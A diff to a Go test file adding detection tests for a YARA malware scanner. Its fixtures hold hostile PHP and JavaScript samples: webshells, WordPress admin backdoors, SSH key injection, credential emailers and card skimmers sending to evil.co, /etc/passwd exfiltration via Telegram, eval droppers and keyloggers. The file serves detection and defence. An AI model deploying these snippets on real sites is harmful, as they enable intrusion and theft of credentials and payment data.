@@ -26,6 +26,14 @@ func TestFPFlood_WebshellMarijuana_MedicalDemoContent(t *testing.T) {
 	}
 }
 
+func TestFPFlood_WebshellMarijuana_PhpBanner(t *testing.T) {
+	s := loadRepoYaraScanner(t)
+	mal := []byte(`<?php /* Marijuana PHP Shell */ passthru($_GET['c']);`)
+	if !hasYaraRule(s.ScanBytes(mal), "webshell_marijuana") {
+		t.Error("webshell_marijuana regression: PHP-qualified shell banner not detected")
+	}
+}
+
 func TestFPFlood_ExploitWpAdminCreation_StockUpgrade(t *testing.T) {
 	s := loadRepoYaraScanner(t)
 	legit := []byte(`<?php
@@ -40,6 +48,23 @@ func TestFPFlood_ExploitWpAdminCreation_StockUpgrade(t *testing.T) {
 	mal := []byte(`<?php $u=wp_create_user('backdoor','P@ssw0rd123','x@evil.co'); $usr=new WP_User($u); $usr->set_role('administrator');`)
 	if !hasYaraRule(s.ScanBytes(mal), "exploit_wp_admin_creation") {
 		t.Error("exploit_wp_admin_creation regression: hardcoded-credential admin backdoor not detected")
+	}
+}
+
+func TestFPFlood_ExploitWpAdminCreation_DirectRequestCredentials(t *testing.T) {
+	s := loadRepoYaraScanner(t)
+	direct := []byte(`<?php $u=wp_create_user($_POST['login'], $_POST['password']); $user=new WP_User($u); $user->set_role('administrator');`)
+	if !hasYaraRule(s.ScanBytes(direct), "exploit_wp_admin_creation") {
+		t.Error("exploit_wp_admin_creation regression: request-driven admin backdoor not detected")
+	}
+	viaVariables := []byte(`<?php $login=$_GET['username']; $password=$_POST['password']; $u=wp_create_user($login,$password); (new WP_User($u))->set_role('administrator');`)
+	if !hasYaraRule(s.ScanBytes(viaVariables), "exploit_wp_admin_creation") {
+		t.Error("exploit_wp_admin_creation regression: variable request credentials not detected")
+	}
+
+	legit := []byte(`<?php $schema = ['user_pass' => 'example', 'role' => 'administrator']; function update_profile($user_id) { return true; }`)
+	if hasYaraRule(s.ScanBytes(legit), "exploit_wp_admin_creation") {
+		t.Error("exploit_wp_admin_creation FP: matched credential-shaped data without a user creation call")
 	}
 }
 
@@ -62,6 +87,18 @@ func TestFPFlood_BackdoorSshKeyInjection_StockLibs(t *testing.T) {
 	}
 }
 
+func TestFPFlood_BackdoorSshKeyInjection_DecodedKey(t *testing.T) {
+	s := loadRepoYaraScanner(t)
+	decoded := []byte(`<?php $key = base64_decode($_POST['key']); file_put_contents('/root/.ssh/authorized_keys', $key, FILE_APPEND);`)
+	if !hasYaraRule(s.ScanBytes(decoded), "backdoor_ssh_key_injection") {
+		t.Error("backdoor_ssh_key_injection regression: decoded key injection not detected")
+	}
+	direct := []byte(`<?php $key = $_REQUEST['public_key']; file_put_contents('/root/.ssh/authorized_keys', $key, FILE_APPEND);`)
+	if !hasYaraRule(s.ScanBytes(direct), "backdoor_ssh_key_injection") {
+		t.Error("backdoor_ssh_key_injection regression: request-provided key injection not detected")
+	}
+}
+
 func TestFPFlood_CredentialHarvesterPhp_WooCommerce(t *testing.T) {
 	s := loadRepoYaraScanner(t)
 	legit := []byte(`<?php class WC_Form_Handler {
@@ -74,9 +111,17 @@ func TestFPFlood_CredentialHarvesterPhp_WooCommerce(t *testing.T) {
 	if hasYaraRule(s.ScanBytes(legit), "credential_harvester_php") {
 		t.Error("credential_harvester_php FP: matched WooCommerce form handler")
 	}
+	staticMethod := []byte(`<?php $email=$_POST['email']; $password=$_POST['password']; Mailer::mail($to, $email, $password);`)
+	if hasYaraRule(s.ScanBytes(staticMethod), "credential_harvester_php") {
+		t.Error("credential_harvester_php FP: matched a static mail method as the PHP builtin")
+	}
 	mal := []byte(`<?php mail('drop@evil.co', 'creds', 'u='.$_POST['email'].' p='.$_POST['password']);`)
 	if !hasYaraRule(s.ScanBytes(mal), "credential_harvester_php") {
 		t.Error("credential_harvester_php regression: real credential emailer not detected")
+	}
+	assigned := []byte(`<?php $email=$_POST['email']; $password=$_POST['password']; mail($drop, 'creds', "u=$email p=$password");`)
+	if !hasYaraRule(s.ScanBytes(assigned), "credential_harvester_php") {
+		t.Error("credential_harvester_php regression: assigned credentials in mail body not detected")
 	}
 }
 
@@ -97,6 +142,14 @@ func TestFPFlood_DropperTelegramExfil_Monolog(t *testing.T) {
 	}
 }
 
+func TestFPFlood_DropperTelegramExfil_RuntimeToken(t *testing.T) {
+	s := loadRepoYaraScanner(t)
+	mal := []byte(`<?php $token=getenv('BOT_TOKEN'); $data=file_get_contents('/etc/passwd'); file_get_contents('https://api.telegram.org/bot'.$token.'/sendMessage?text='.urlencode($data));`)
+	if !hasYaraRule(s.ScanBytes(mal), "dropper_telegram_exfil") {
+		t.Error("dropper_telegram_exfil regression: sensitive-data exfil with runtime token not detected")
+	}
+}
+
 func TestFPFlood_MailerSmtpRelay_StockPhpmailer(t *testing.T) {
 	s := loadRepoYaraScanner(t)
 	legit := []byte(`<?php class SMTP {
@@ -109,6 +162,22 @@ func TestFPFlood_MailerSmtpRelay_StockPhpmailer(t *testing.T) {
 	mal := []byte(`<?php $list=file('targets.txt'); foreach($list as $to){ $sk=fsockopen('127.0.0.1',25); fputs($sk,"MAIL FROM:<spam@x>\r\nRCPT TO:<$to>\r\n"); }`)
 	if !hasYaraRule(s.ScanBytes(mal), "mailer_smtp_relay") {
 		t.Error("mailer_smtp_relay regression: real mass SMTP relay loop not detected")
+	}
+}
+
+func TestFPFlood_MailerSmtpRelay_RequestDrivenSingleShot(t *testing.T) {
+	s := loadRepoYaraScanner(t)
+	mal := []byte(`<?php $host=$_POST['x']; $from=$_POST['y']; $to=$_POST['z']; $s=fsockopen($host,25); fputs($s,"MAIL FROM:<".$from.">\r\n"); fputs($s,"RCPT TO:<".$to.">\r\n");`)
+	if !hasYaraRule(s.ScanBytes(mal), "mailer_smtp_relay") {
+		t.Error("mailer_smtp_relay regression: request-driven single-shot SMTP relay not detected")
+	}
+}
+
+func TestFPFlood_MailerSmtpRelay_ForLoop(t *testing.T) {
+	s := loadRepoYaraScanner(t)
+	mal := []byte(`<?php $s=fsockopen('127.0.0.1',25); for($i=0;$i<count($emails);$i++){ fputs($s,"MAIL FROM:<spam@x>\r\nRCPT TO:<".$emails[$i].">\r\n"); }`)
+	if !hasYaraRule(s.ScanBytes(mal), "mailer_smtp_relay") {
+		t.Error("mailer_smtp_relay regression: indexed recipient loop not detected")
 	}
 }
 
@@ -127,6 +196,10 @@ func TestFPFlood_DropperPhpInputStream_ServicesJson(t *testing.T) {
 	if !hasYaraRule(s.ScanBytes(mal), "dropper_php_input_stream") {
 		t.Error("dropper_php_input_stream regression: real php://input eval dropper not detected")
 	}
+	assigned := []byte(`<?php $payload=file_get_contents('php://input'); eval($payload);`)
+	if !hasYaraRule(s.ScanBytes(assigned), "dropper_php_input_stream") {
+		t.Error("dropper_php_input_stream regression: assigned request-body payload not detected")
+	}
 }
 
 func TestFPFlood_ObfuscationChrConstruction_FontLib(t *testing.T) {
@@ -138,6 +211,14 @@ func TestFPFlood_ObfuscationChrConstruction_FontLib(t *testing.T) {
 	mal := []byte(`<?php $c=chr(115).chr(121).chr(115).chr(116).chr(101).chr(109).chr(40).chr(102).chr(41).chr(59); eval($c);`)
 	if !hasYaraRule(s.ScanBytes(mal), "obfuscation_chr_construction") {
 		t.Error("obfuscation_chr_construction regression: chr-built dynamic call not detected")
+	}
+}
+
+func TestFPFlood_ObfuscationChrConstruction_VariableFunction(t *testing.T) {
+	s := loadRepoYaraScanner(t)
+	mal := []byte(`<?php $f=chr(97).chr(115).chr(115).chr(101).chr(114).chr(116).chr(0).chr(0).chr(0).chr(0); $f();`)
+	if !hasYaraRule(s.ScanBytes(mal), "obfuscation_chr_construction") {
+		t.Error("obfuscation_chr_construction regression: chr-built variable function not detected")
 	}
 }
 
@@ -157,6 +238,18 @@ func TestFPFlood_PhpGotoObfuscation_WpHtmlProcessor(t *testing.T) {
 	mal := []byte(`<?php goto x7Fa2; q9Zk3: goto b4Nm8; x7Fa2: goto q9Zk3; b4Nm8: goto k2Lp9; k2Lp9: goto w8Rt4; w8Rt4: goto z1Xy6; z1Xy6: goto m5Qn0; m5Qn0: goto v3Bc7; v3Bc7: goto p6Dd1; p6Dd1: eval($_POST['x']);`)
 	if !hasYaraRule(s.ScanBytes(mal), "php_goto_obfuscation") {
 		t.Error("php_goto_obfuscation regression: random-label goto obfuscation not detected")
+	}
+}
+
+func TestFPFlood_PhpGotoObfuscation_AlphabeticLabels(t *testing.T) {
+	s := loadRepoYaraScanner(t)
+	mal := []byte(`<?php goto qwertyu; asdfghj: goto zxcvbnm; qwertyu: goto asdfghj; zxcvbnm: goto poiuytr; poiuytr: goto lkjhgfd; lkjhgfd: goto mnbvcxz; mnbvcxz: goto qazwsxe; qazwsxe: goto plmokni; plmokni: goto wsxedcr; wsxedcr: goto rfvtgby; rfvtgby: goto yhnujmi; yhnujmi: goto ikolpaz; ikolpaz: eval($_POST['x']);`)
+	if !hasYaraRule(s.ScanBytes(mal), "php_goto_obfuscation") {
+		t.Error("php_goto_obfuscation regression: alphabetic random-label obfuscation not detected")
+	}
+	legit := []byte(`<?php if($a)goto cleanup;if($b)goto cleanup;if($c)goto cleanup;if($d)goto cleanup;if($e)goto cleanup;if($f)goto cleanup;if($g)goto cleanup;if($h)goto cleanup;if($i)goto cleanup;if($j)goto cleanup;if($k)goto cleanup;cleanup:return;`)
+	if hasYaraRule(s.ScanBytes(legit), "php_goto_obfuscation") {
+		t.Error("php_goto_obfuscation FP: matched repeated readable cleanup branches without an execution sink")
 	}
 }
 
@@ -184,6 +277,19 @@ func TestFPFlood_ExfilKeyloggerJs_StockEditorBundle(t *testing.T) {
 	}
 }
 
+func TestFPFlood_ExfilKeyloggerJs_SameOriginPost(t *testing.T) {
+	s := loadRepoYaraScanner(t)
+	variants := [][]byte{
+		[]byte(`document.addEventListener('keypress',function(e){fetch('/assets/collect',{method:'POST',body:JSON.stringify({key:e.key,value:e.target.value})});});`),
+		[]byte(`document.onkeydown=function(e){fetch('collect.php',{method:'POST',body:'key='+e.key});};`),
+	}
+	for _, mal := range variants {
+		if !hasYaraRule(s.ScanBytes(mal), "exfil_keylogger_js") {
+			t.Errorf("exfil_keylogger_js regression: same-origin keystroke POST not detected: %s", mal)
+		}
+	}
+}
+
 func TestFPFlood_WoocommerceSkimmer_StockElementor(t *testing.T) {
 	s := loadRepoYaraScanner(t)
 	legit := []byte(`var cfg={woocommerce:true,fields:["cvv","cvc"]};navigator.sendBeacon("/wp-json/wc/track",JSON.stringify({event:"view"}));fetch("/wc/cart");`)
@@ -193,6 +299,19 @@ func TestFPFlood_WoocommerceSkimmer_StockElementor(t *testing.T) {
 	mal := []byte(`var c=document.querySelector('#woocommerce_card_number').value,cvv=document.querySelector('#cvv').value;fetch('https://evil.co/s',{method:'POST',body:'number='+c+'&cvv='+cvv});`)
 	if !hasYaraRule(s.ScanBytes(mal), "exploit_wp_woocommerce_skimmer") {
 		t.Error("exploit_wp_woocommerce_skimmer regression: real card skimmer not detected")
+	}
+}
+
+func TestFPFlood_WoocommerceSkimmer_SameOriginPost(t *testing.T) {
+	s := loadRepoYaraScanner(t)
+	variants := [][]byte{
+		[]byte(`var number=document.querySelector('#woocommerce_card_number').value;fetch('/wp-json/cache',{method:'POST',body:JSON.stringify({card_number:number})});`),
+		[]byte(`var cvv=document.querySelector('.woocommerce-cvc').value;fetch('cache.php',{method:'POST',body:'cvv='+cvv});`),
+	}
+	for _, mal := range variants {
+		if !hasYaraRule(s.ScanBytes(mal), "exploit_wp_woocommerce_skimmer") {
+			t.Errorf("exploit_wp_woocommerce_skimmer regression: same-origin card-data POST not detected: %s", mal)
+		}
 	}
 }
 
@@ -214,5 +333,18 @@ func TestFPFlood_SpamHiddenLinks_ElementorDemo(t *testing.T) {
 	m = append(m, []byte(`</div>`)...)
 	if !hasYaraRule(s.ScanBytes(m), "spam_hidden_links") {
 		t.Error("spam_hidden_links regression: real hidden spam-link block not detected")
+	}
+}
+
+func TestFPFlood_SpamHiddenLinks_NestedAnchorMarkup(t *testing.T) {
+	s := loadRepoYaraScanner(t)
+	var mal []byte
+	mal = append(mal, []byte(`<div style="left:-9999px; position:absolute">`)...)
+	for i := 0; i < 10; i++ {
+		mal = append(mal, []byte(`<a href="https://spam.example"><span>casino loans</span></a><br>`)...)
+	}
+	mal = append(mal, []byte(`</div>`)...)
+	if !hasYaraRule(s.ScanBytes(mal), "spam_hidden_links") {
+		t.Error("spam_hidden_links regression: hidden nested-link block not detected")
 	}
 }
